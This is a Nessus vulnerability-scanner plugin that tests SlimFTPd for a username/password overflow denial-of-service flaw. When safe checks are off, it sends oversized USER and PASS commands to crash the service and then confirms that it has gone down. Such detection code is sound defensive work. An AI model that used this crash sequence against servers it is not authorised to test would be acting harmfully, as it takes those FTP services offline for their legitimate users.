#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(19588);
  script_version("$Revision: 1.13 $");

  script_cve_id("CVE-2005-2850");
  script_bugtraq_id(14723);
  script_osvdb_id(19143);
 
  script_name(english:"SlimFTPd Username/Password Overflow Remote DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is prone to a denial of service attack." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be using SlimFTPd, a free, small,
standards-compliant FTP server for Windows. 

The installed version of SlimFTPd on the remote host suffers from a
denial of service vulnerability.  By sending 'user' and 'pass'
commands that are each 40 bytes long, an attacker will crash the
service after about a short period of time." );
 script_set_attribute(attribute:"see_also", value:"http://www.critical.lt/?vuln/8" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/09/06");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/08/31");
 script_cvs_date("$Date: 2015/12/23 21:38:31 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

  script_summary(english:"Checks for multiple buffer overflow vulnerabilities in SlimFTPd < 3.17");
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"FTP");
  script_copyright(english:"This script is Copyright (C) 2005-2015 Tenable Network Security, Inc.");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_exclude_keys("global_settings/supplied_logins_only");
  script_require_ports("Services/ftp", 21);
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("ftp_func.inc");

if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

port = get_ftp_port(default: 21);


# If it looks like SlimFTPd...
banner = get_ftp_banner(port:port);
if (banner && "220-SlimFTPd" >< banner) {
  # If safe checks are enabled...
  if (safe_checks()) {
    # There's a problem if the banner reports it's 3.17 or older.
    if (egrep(string:banner, pattern:"^220-SlimFTPd ([0-2]\.|3\.1[0-7][^0-9])")) {
      report = string(
        "Note that Nessus has determined the vulnerability exists on the\n",
        "remote host simply by looking at the version number of SlimFTPd\n",
        "installed there.\n"
      );
      security_warning(port:port, extra:report);
    }
    exit(0);
  }
  # Otherwise...
  else {
    # Try a couple of times to crash it.
    #
    # nb: the service seems to crash only when it hasn't received
    #     a connection for a while. Thus, if the target is an
    #     active server, the plugin probably won't pick up the
    #     flaw even though the exploit will eventually work.
    conns = 0;
    for (i=0; i < 3; i++) {
      soc = open_sock_tcp(port);
      if (soc) {
        conns++;
        s = ftp_recv_line(socket:soc);

        c = "USER " +  crap(40);
        send(socket:soc, data: c + '\r\n');
        s = ftp_recv_line(socket:soc);

        if (s && '331 Need password for user "".' >< s) {
          c = "PASS " + crap(40);
          send(socket:soc, data: c + '\r\n');
          s = ftp_recv_line(socket:soc);
          if (s && "503 Bad sequence of commands. Send USER first." >< s) {
            close(soc);
            sleep(30);
          }
        }
      }
    }

    # If we sent at least one exploit, see if it's down now.
    if (conns) {
      soc = open_sock_tcp(port);
      if (soc) close(soc);
      else {
        if (service_is_dead(port: port) <= 0)
	  exit(1, "Could not reconnect to port "+port+".");
        security_warning(port);
        exit(0);
      }
    }
  }
}
